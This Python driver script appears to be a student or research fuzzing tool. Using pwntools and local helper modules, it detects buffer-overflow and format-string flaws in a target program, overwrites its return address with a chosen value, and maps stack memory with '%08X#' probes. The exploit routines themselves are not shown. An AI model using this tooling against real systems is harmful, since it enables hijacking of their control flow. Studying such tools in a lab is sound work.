import resource
import os
import sys
from pwn import *
from pwnlib import *
from pwn import p32
import format_string
import buffer_overflow
       
def test():
    print(test)

  
        
def format_partial_address(address_str, mask):

    address_hex = address_str[2:]  # Remove "0x" prefix

    if len(address_hex) % 2 != 0:
        address_hex= "0" + address_hex # Pad with a leading zero if necessary

    try:
        address_bytes = bytes.fromhex(address_hex)[::-1]
        missing_bytes=0
        if mask=="0xFF000000":
            missing_bytes=3
        elif mask=="0xFFFF0000":
            missing_bytes=2
        elif mask=="0xFFFFFF00":
            missing_bytes=1
        else:
            return address_bytes
        partial = address_bytes[missing_bytes:]
        return partial
    except ValueError:
        return 0
        
            
# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    #Set the core file limit and path
    resource.setrlimit(
    resource.RLIMIT_CORE,
    (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
    stream = os.popen('echo Returned output')
    output = stream.read()
    if output != "kernel.core_pattern = core":
        os.system("sudo sysctl kernel.core_pattern=core")
    #////////////////////////////////
    
    #Read the parameters from the input file
    f = open("input.txt", "r")
    
    line = f.readline().split()
    fuzz_file=line[line.index("=") +1]
    
    line = f.readline().split()
    fuzzed_program=line[line.index("=") +1]
    
    line = f.readline().split()
    attack_address=int(line[line.index("=") +1],base=16)
    
    line = f.readline().split()
    partial_attack_address_str=line[line.index("=") +1]
    
    line = f.readline().split()
    partial_attack_address_mask=line[line.index("=") +1]
    
    line = f.readline().split()
    mutations=int(line[line.index("=") +1])
    
    input_from_file=False
    line = f.readline().split()
    if line[line.index("=") +1] == 'True':
        input_from_file=True
    
    check_for_buffer_overflow=False
    line = f.readline().split()
    if line[line.index("=") +1] == 'True':
        check_for_buffer_overflow=True
        
    detailed_log=False
    line = f.readline().split()
    if line[line.index("=") +1] == 'True':
        detailed_log=True   
        
    show_fails=False
    line = f.readline().split()
    if line[line.index("=") +1] == 'True':
        show_fails=True  
    #Set variables for the fuzzed program
    attack_little_endian=p32(attack_address, endian='little')
    partial_attack_address=format_partial_address(partial_attack_address_str,partial_attack_address_mask)
    if partial_attack_address==0:
        print("Something is wrong with the partial address")
    else:
        sys.stdout = open('log.txt', 'w')
        
        #test()
        
        if check_for_buffer_overflow:
            len_to_reach_return_addr = buffer_overflow.find_min_bad_len(fuzz_file, fuzzed_program, mutations,input_from_file,detailed_log)
            if len_to_reach_return_addr==sys.maxsize:
                print("The bufferoverflow was not reached or recheck if the parameters are the rigth ones")
            else:
                buffer_overflow.attack_system(len_to_reach_return_addr,fuzzed_program,fuzz_file,attack_little_endian,input_from_file,detailed_log)
                valid_addresses=buffer_overflow.attack_with_partial_address(len_to_reach_return_addr,partial_attack_address, fuzzed_program,fuzz_file,input_from_file,
                                                                       detailed_log)
                print(f"A total {len(valid_addresses)} of valid addresses that deflect the program:")
                print(valid_addresses)
                buffer_overflow.break_system_before_return(len_to_reach_return_addr, fuzzed_program, fuzz_file, input_from_file,detailed_log)
        else:
            format_parameter="%08X#"
            if format_string.check_for_format_string(fuzzed_program,format_parameter,fuzz_file,input_from_file,detailed_log):
                print("The program contains the format string vulnerability")
                max_len=format_string.max_length_of_the_format_string(fuzzed_program,fuzz_file,input_from_file,detailed_log)
                len_of_string=format_string.how_many_format_parameters(fuzzed_program,format_parameter,mutations,max_len,fuzz_file,input_from_file,detailed_log)
                if len_of_string!=0:
                    possitions_of_validAddresses,string_value_of_valid_address=format_string.map_memory(fuzzed_program,format_parameter,len_of_string,fuzz_file,
                                                                                   input_from_file,detailed_log,show_fails)
                    print(f"There are {len(possitions_of_validAddresses)} bytes that contain a valid address after trying {mutations} mutations:")
                    print("They represent the relative position from the beginning of the stack of the fuzzed program:")
                    print("Offset \t \t Value")
                    possible_return_adr=[]
                    for i in range(len(possitions_of_validAddresses)):
                        if string_value_of_valid_address[i].isascii() and string_value_of_valid_address[i]!="":
                            possible_return_adr.append(possitions_of_validAddresses[i])           
                        print(f"{possitions_of_validAddresses[i]} \t \t \t {string_value_of_valid_address[i]}\n")
                    print(f"There are {len(possible_return_adr)} addresses were the Return address could reside in:")
                    print(possible_return_adr)
            else:
                print("The program does NOT contain the format string vulnerability")
                
            
        sys.stdout.close()



